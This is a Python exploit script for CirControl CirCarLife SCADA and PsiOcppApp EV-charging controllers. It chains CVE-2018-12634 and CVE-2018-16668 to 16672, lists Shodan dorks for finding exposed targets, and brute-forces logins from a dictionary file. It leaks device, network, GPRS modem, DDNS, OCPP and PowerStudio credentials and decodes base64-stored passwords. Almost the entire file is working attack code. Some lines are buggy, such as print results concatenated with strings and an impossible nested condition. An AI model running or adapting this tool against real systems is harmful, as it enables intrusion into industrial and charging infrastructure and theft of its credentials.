import requests
from requests.auth import HTTPDigestAuth
from bs4 import BeautifulSoup
import xml.etree.ElementTree as ET
import re
import json
import base64 

cabecera = '''
                              _.-="_-         _
                         _.-="   _-          | ||"""""""---._______     __..
             ___.===""""-.______-,,,,,,,,,,,,`-''----" """""       """""  __'
      __.--""     __        ,'     CIR-PWN-LIFE  o \            __        [__|
 __-""=======.--""  ""--.=================================.--""  ""--.=======:
]       [w] : /        \ : |========================|    : /        \ :  [w] :
V___________:| SadFud75 |: |========================|    :|          |:   _-"
 V__________: \        / :_|=======================/_____: \        / :__-"
 -----------'  "-____-"  `-------------------------------'  "-____-"

'''

print  (cabecera, 'white')
print  ('[*] POC for automated exploitation for CirControl SCADA systems (circarlife and OCPP (Open Charge Point Protocol))', ' ')
print  ('[?] Vendor site: https://circontrol.com/', ' ')
print  ('[*] CVEs associated: ', ' ') 
print  ('CVE-2018-12634, CVE-2018-16668, CVE-2018-16669, CVE-2018-16670, CVE-2018-16671, CVE-2018-16672', ' ')
print  ('[*] CirCarLife Scada versions affected: ', ' ') 
print  ('[+] All versions are vulnerable. No patch available, last version 4.3.0 (09/09/2018)', ' ')
print  ('[*] PsiOcppApp (PowerStudio integration Open Charge Point Protocol Application) versions affected: ', ' ') 
print  ('[+] All versions are vulnerable. No patch available, last version 1.5.0 (09/09/2018)', ' ')
print  ('[*] Shodan dorks: ', ' ')
print  ('[+] Server: CirCarLife', ' ')
print  ('[+] Server: PsiOcppApp', ' ')
print  ('[?] More vulnerability POCs at https://github.com/SadFud/Exploits', ' ')

plcs = []
logutil = ['GPRS modem details']
autenticado = False

arr_versionessoft = []
arr_ldevstat = []
str_repository = ''
str_lversioneshard = ''
arr_logdetails = []
str_lsetup = ''
str_lconfig = ''

def lversionessoft(): 
    print  ('[*] Getting software versions via CVE-2018-16671', ' ')
    leakv = requests.get(target1 + '/html/device-id')
    versiones = leakv.text.encode("utf8").split('\n')
    print  ('[+] Software versions collected succesfully', ' ')
    return versiones

def ldevstat(): 
    print  ('[*] Getting plc status via CVE-2018-16670', ' ')
    leakstats = requests.get(target1 + '/services/user/values.xml?var=STATUS')
    statsraw = leakstats.text
    tree = ET.fromstring(statsraw)
    for i in range(0,len(tree.findall(".//variable"))):
        for j in range(0,2):
            plcs.append(tree[i][j].text)
    print  ('[+] information leaked from ' + str(len(plcs)/2) + ' plcs', ' ')
    return plcs

def plcstatus(code): 
    code = int(code)
    if code == 1:
        print  ('[+] OK', ' ')
    elif code == 2:
        if code == 0x10:
            if code == 0x20:
                print  ('[-] Error: Time out.', ' ')
            elif code == 0x40:
                print  ('[-] Error: Bad device.', ' ')
            elif code == 0x80:
                print  ('[-] Error: Bad phase.', ' ')
            elif code == 0x100:
                print  ('[-] Error: Bad version.', ' ')
        else:
            print  ('[-] Error: Unknown error.', ' ')
    elif code == 4:
        print  ('[-] Error: not initialized.', ' ')
    else:
        print  ('[?] Unknown code.', ' ')

def repository(): 
    print  ('[*] Getting installation paths via CVE-2018-16668', ' ')
    path = requests.get(target1 + '/html/repository')
    rutas = path.text.encode("utf8").split('\n')
    platformpath = rutas[1].split(' ')
    platformpath = platformpath[0]
    appsrc = rutas[3]
    appsrc = rutas[3].split(' ')
    appsrc = appsrc[0]
    raiz = str(appsrc).find('/circarlife/')
    appsrc = appsrc[0:raiz+len('/circarlife/')]
    print  ('[+] Platform installation path retrieved succesfully', ' ')  
    return 'Platform installation path: ' + platformpath + '\n[+] Applicaction installation path: ' + appsrc
    
def lversioneshard(): 
    print  ('[*] Getting powerstudio driver versions via CVE-2018-12634', ' ')
    basura = ['/li', '<', 'body', 'html', '>', '/ul', '/']
    hardleak = requests.get(target1 + '/services/system/info.html')
    hardleak = hardleak.text.encode("utf8").replace('<br />', '\n')
    hardleak = hardleak.replace('<li>', '\n')
    for caca in basura:
        hardleak = hardleak.replace(caca, '')
    print  ('[+] Powerstudio driver versions leaked succesfully', ' ')
    return hardleak

def logdetails():
    print  ('[*] Leaking sensitive information via CVE-2018-12634', ' ')
    log = requests.get(target1 + '/html/log')
    log = log.text.encode("utf8")
    print  ('[*] Searching for modem id', ' ')
    posmid = log.rfind('/modem-start: modem id: ')
    logarr = log.split('\n')    
    if posmid != -1:
        logutil.append('Modem model:')
        print  ('[*] Modem id located', ' ')
        for linea in logarr:
            if '/modem-start: modem id: ' in linea:
                print  ('[+] Modem id leaked', ' ')            
                linea = linea.split(' ')
                logutil.append(linea[9])
    else:
        print  ('[-] Modem id not found', ' ')
    print  ('[*] Searching for GPRS modem c entials', ' ')
    poslogin = log.rfind('Greetings!!')
    if poslogin != -1:
        print  ('[*] C entials found', ' ')
        logutil.append('Modem c entials')
        print  ('[+] GPRS modem c entials retrieved', ' ')
        for linea in logarr:
            if 'password=\"' in linea:
                linea = linea.split(' ')
                logutil.append(linea[11])
                logutil.append(linea[12])
    else:
        print  ('[-] GPRS modem c entials not found with CVE-2018-12634', ' ')
    return logutil

def lsetup(user, pwd): 
    print  ('[*] Exploiting CVE-2018-16672 to leak information', ' ')
    r1 = requests.get(target1 + '/services/system/setup.json', auth=HTTPDigestAuth(user, pwd))
    if r1.text.encode("utf8").find('not granted') != -1:
        print  ('[-] Error, login failed', ' ')
    else:
        respuesta = r1.text.encode("utf8")
        print  ('[+] Setup information leaked')
        return respuesta

def lbrute():
    global luser80
    global lpasswd80
    global luser8080
    global lpasswd8080
    dicc =  input('Enter dictionary file with extension[format[user:password]]: ')
    listado = open(dicc, "r")
    data = listado.readlines() 
    print  ('[*] Starting bruteforce...', ' ')
    for linea in data:
        linea = linea.split(':')
        user = linea[0]
        pwd = linea[1]
        r1 = requests.get(target1 + '/services/system/setup.json', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
        r2 = requests.get(target2 + '/services/config/config.xml', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
        if r1.text.encode("utf8").find('not granted') != -1:
            print  ('[-] Error, login failed on port 80 with ' + user + ':' + pwd, ' ')
        else:
            print  ('[+] Valid c entials found on port 80: ' + user + ':' + pwd, ' ')
            luser80 = user
            lpasswd80 = pwd
        if r2.text.encode("utf8").find('Acess not granted') != -1:
            print  ('[-] Error, login failed on port 8080 with ' + user + ':' + pwd, ' ')
        else:
            print  ('[+] Valid c entials found on port 8080: ' + user + ':' + pwd, ' ')
            luser8080 = user
            lpasswd8080 = pwd
    listado.close()

def lconfig(user, pwd):
    print  ('[*] Leaking config file via CVE-2018-16669', ' ')
    r2 = requests.get(target2 + '/services/config/config.xml', auth=HTTPDigestAuth(user.strip(), pwd.strip()))
    if r2.text.encode("utf8").find('Acess not granted') != -1:
        print  ('[-] Error. Login failed', ' ')
    else:
        config = r2.text.encode('utf8')
        print  ('[+] Config file leaked succesfully', ' ')
        return config

def salida(versiones, plcs, ruta, hard, log, setup, config):
    print  ('[*] Parsing information and generating output.', ' ')
    print  ('[*] Parsing software information', ' ')
    print  ('[+] Device name: ', ' ') + versiones[0]
    print  ('[+] Software_name: ', ' ') + versiones[1]
    print  ('[+] Software_version: ', ' ') + versiones[2] 
    print  ('[+] System time: ', ' ') + versiones[3]
    print  ('[+] ', ' ') + ruta
    print  ('[*] Parsing powerstudio driver versions', ' ')
    hard = hard.replace('ul', '')
    print  (hard.strip(), ' ')
    print  ('[*] Parsing PLCs values', ' ')
    for i in range(0,len(plcs)):
        if ((i % 2) != 0):
            codigo = plcs[i].split('.')
            plcstatus(codigo[0])
        else:
            nombre = plcs[i].replace('.STATUS', '')
            print  ('[+] PLC name: ' + nombre, ' ')
    print  ('[*] Parsing leaked data from logs using CVE-2018-12634', ' ')
    if len(log) > 3:
        print  ('[*] ' + log[0], ' ')
        for i in range(2,len(log)):
            if log[i] != 'Modem c entials':
                print  ('[+] GPRS router model found: ', ' ') + log[i]
                break
        for i in range(0,len(log)):
            if log[i] == 'Modem c entials':
                cs = i
                break

        for i in range(cs + 1, len(log)):
            if (log[i].rfind('user=')) != -1:
                usuario = log[i].split('=')
                user = usuario[1]
                user = user.replace('\"', '')
            if (log[i].rfind('password=')) != -1:
                cont = log[i].split('=')
                contrase = cont[1]
                contrase = contrase.replace('\"', '')
                contrase = contrase.replace(']', '')
                break
        print  ('[+] Username and password for GPRS modem found: ', ' ') + user + ':' + contrase
    else:
         ('[?] No data was extracted from logs using CVE-2018-12634', ' ')
    print  ('[*] Parsing setup file', ' ')
    if (len(str(setup)) > 5):
        datos = json.loads(setup)
        print  ('[*] Processing device configuration data: ', ' ')
        print  ('[+] MAC Address: ', ' ') + datos["device"]["mac"]
        print  ('[+] IMEI: ', ' ') + datos["device"]["imei"]
        print  ('[+] ICCID: ', ' ') + datos["device"]["iccid"]
        print  ('[+] IMSI: ', ' ') + datos["device"]["imsi"]
        print  ('[*] Processing network configuration data: ', ' ')
        print  ('[+] Hostname: ', ' ') + datos["network"]["hostname"]
        print  ('[+] ClientId: ', ' ') + datos["network"]["clientid"]
        print  ('[+] IP address: ', ' ') + datos["network"]["ip"]
        print  ('[+] Netmask: ', ' ') + datos["network"]["netmask"]
        print  ('[+] Gateway: ', ' ') + datos["network"]["gateway"]
        print  ('[+] Name server 0: ', ' ') + datos["network"]["nameserver0"]
        print  ('[+] Name server 1: ', ' ') + datos["network"]["nameserver1"]
        print  ('[*] Processing locale options configuration data', ' ')
        print  ('[+] Language: ', ' ') + datos["locale"]["language"]
        print  ('[+] Currency: ', ' ') + datos["locale"]["currency"]
        print  ('[*] Processing public address configuration data', ' ')
        print  ('[+] Host type: ', ' ') + datos["paddress"]["hosttype"]
        print  ('[+] Host: ', ' ') + datos["paddress"]["host"]
        print  ('[*] Processing time configuration data', ' ')
        print  ('[+] NTP Server 0: ', ' ') + datos["time"]["ntpserver0"]
        print  ('[+] NTP server 1: ', ' ') + datos["time"]["ntpserver1"]
        print  ('[+] Timezone: ', ' ') + datos["time"]["timezone"]
        print  ('[*] Processing GPRS modem configuration data', ' ')
        print  ('[+] Acess point name: ', ' ') + datos["modem"]["apn"]
        print  ('[+] Username: ', ' ') + datos["modem"]["usr"]
        print  ('[+] Password: ', ' ') + datos["modem"]["pwd"]
        print  ('[+] Reset: ', ' ') + str(datos["modem"]["reset"])
        print  ('[+] Ping Ip: ', ' ') + str(datos["modem"]["pingip"])
        print  ('[+] Ping period: ', ' ') + str(datos["modem"]["pingperiod"])
        print  ('[+] Ping auto reset: ', ' ') + str(datos["modem"]["pingautoreset"])
        print  ('[*] Processing DDNS configuration data', ' ')
        print  ('[+] DDNS server: ', ' ') + datos["ddns"]["server"]
        print  ('[+] DDNS host: ', ' ') + datos["ddns"]["host"]
        print  ('[+] DDNS Username: ', ' ') + datos["ddns"]["usr"]
        print  ('[+] DDNS password: ', ' ') + datos["ddns"]["pwd"]
        print  ('[*] Processing security configuration data', ' ')
        print  ('[+] Username: ', ' ') + datos["security"]["user"]
        print  ('[+] Password: ', ' ') + str(datos["security"]["passwd"])
        print  ('[*] Processing services configuration data', ' ')
        print  ('[+] iManager', ' ') + str(datos["services"]["imanager"])
        print  ('[+] Active-Integration: ', ' ') + str(datos["services"]["activeIntegration"])
        print  ('[+] Web Editor: ', ' ') + str(datos["services"]["webeditor"])
        print  ('[+] SCADA Applet: ', ' ') + str(datos["services"]["appletscada"])
        print  ('[+] Html5: ', ' ') + str(datos["services"]["html5"])
        print  ('[*] Parsing Open Charge Point Protocol configuration file', ' ')
    else:
        print  ('[-] Unable to retrieve the setup config file', ' ')
    if (len(str(config)) > 10):
        tree = ET.fromstring(config)
        print  ('[*] Processing management system CS settings', ' ')
        print  ('[+] End point: ', ' ') + str(tree.find('.//csEndPoint').text)
        print  ('[+] Username: ', ' ') + str(tree.find('.//csUser').text)
        print  ('[+] Password: ', ' ') + str(tree.find('.//csPassword').text)
        print  ('[+] Litle endian: ', ' ') + str(tree.find('.//isLitleEndian').text)
        print  ('[*] Processing Charge Box settings file', ' ')
        print  ('[+] Charge box Protocol: ', ' ') + str(tree.find('.//cbProtocol').text)
        print  ('[+] Charge box certificate: ', ' ') + str(tree.find('.//cbRequireCsClientCertificate').text)
        print  ('[+] Charge box ID: ', ' ') + str(tree.find('.//cbId').text)
        print  ('[+] Charge box Username: ', ' ') + str(tree.find('.//cbUser').text)
        print  ('[+] Charge box password: ', ' ') + str(tree.find('.//cbPassword').text)
        print  ('[+] Charge box OCPP internal port: ', ' ') + str(tree.find('.//cbOcppPortInternal').text)
        print  ('[+] Charge box OCPP public port: ', ' ') + str(tree.find('.//cbOcppPortPublic').text)
        print  ('[+] Charge box use whitelist: ', ' ') + str(tree.find('.//cbUseWl').text)
        print  ('[+] Charge box whitelist first: ', ' ') + str(tree.find('.//cbWlFirst').text)
        print  ('[+] Charge box offline authentication: ', ' ') + str(tree.find('.//cbAuthOffline').text)
        print  ('[+] Charge box internal error retry delay: ', ' ') + str(tree.find('.//cbRetryInternalErr').text)
        print  ('[+] Charge box use OCPP T-Sync: ', ' ') + str(tree.find('.//cbUseOcppTSync').text)
        print  ('[+] Charge box use compression: ', ' ') + str(tree.find('.//cbUseCompression').text)
        print  ('[+] Charge box use aprtial energy: ', ' ') + str(tree.find('.//cbUsePartialEnergy').text)
        #print  ('[+] Charge box use partial energy meter value: ', ' ') + str(tree.find('.//cbUsePartialEnergyMeterVal').text)
        print  ('[+] Charge box stop if unauthenticated: ', ' ') + str(tree.find('.//cbStopIfUnauth').text)
        print  ('[+] Charge box stop if concurrent tx: ', ' ') + str(tree.find('.//cbStopIfConcurrentTx').text)
        print  ('[+] Charge box hearth-beat interval: ', ' ') + str(tree.find('.//cbHbInterval').text)
        print  ('[+] Charge box connection time out interval: ', ' ') + str(tree.find('.//cbConnTimeOut').text)
        print  ('[+] Charge box meter interval: ', ' ') + str(tree.find('.//cbMeterInterval').text)
        #print  ('[+] Charge box public Ip timeout interval: ', ' ') + str(tree.find('.//cbPublicIpTimeOut').text)
        #print  ('[+] Charge box authentication requi  for remote start: ', ' ') + str(tree.find('.//cbRequireAuthRemoteStart').text)
        #print  ('[+] Charge box meter requires power: ', ' ') + str(tree.find('.//cbMeterValRequiresPower').text)
        print  ('[*] Processing Powerstudio engine settings file' , ' ')
        print  ('[+] Powerstudio engine host: ', ' ') + str(tree.find('.//pwStdHost').text)
        print  ('[+] Powerstudio engine port: ', ' ') + str(tree.find('.//pwStdPort').text)
        print  ('[+] Powerstudio engine username: ', ' ') + str(tree.find('.//pwStdUser').text)
        print  ('[+] Powerstudio engine password: ', ' ') + base64.b64decode(str(tree.find('.//pwStdPassword').text))
        print  ('[+] Powerstudio engine username (with edit permissions): ', ' ') + str(tree.find('.//pwStdUse it').text)
        print  ('[+] Powerstudio engine password (with edit permissions): ', ' ') + base64.b64decode(str(tree.find('.//pwStdPasswordEdit').text))
        print  ('[*] Processing powerstudio application parameters', ' ')
        print  ('[+] Powerstudio application port: ', ' ') + str(tree.find('.//pssPort').text)
        print  ('[+] Powerstudio application admin: ', ' ') + str(tree.find('.//pssAdminUser').text)
        print  ('[+] Powerstudio application password: ', ' ') + base64.b64decode(str(tree.find('.//pssAdminPassword').text))
        print  ('[+] Powerstudio application debug logging level: ', ' ') + str(tree.find('.//pssLoglevel').text)
    else:
        print  ('[-] Unable to retrieve the OCPP config file', ' ')

#entrypoint
url =  input('Insert target ip: ')
target1 = 'http://' + url 
target2 = 'http://' + url + ':8080'
luser80 = 'admin'
lpasswd80 = '1234'
luser8080 = 'admin'
lpasswd8080 = '1234'
luser80 =  input('Insert username for login at circarlife server: (b to bruteforce)')
if (luser80 == 'b'):
    lbrute()
else:    
    lpasswd80 =  input('Insert password for login at circarlife server: ')
    luser8080 =  input('Insert username for login at OCPP server: ')
    lpasswd8080 =  input('Insert password for login at OCPP server: ')

versiones = lversionessoft()   
plcs = ldevstat()
ruta = repository()
hard = lversioneshard()
log = logdetails()
setup = lsetup(luser80.strip(), lpasswd80.strip())
config = lconfig(luser8080.strip(), lpasswd8080.strip())
salida(versiones, plcs, ruta, hard, log, setup, config)
            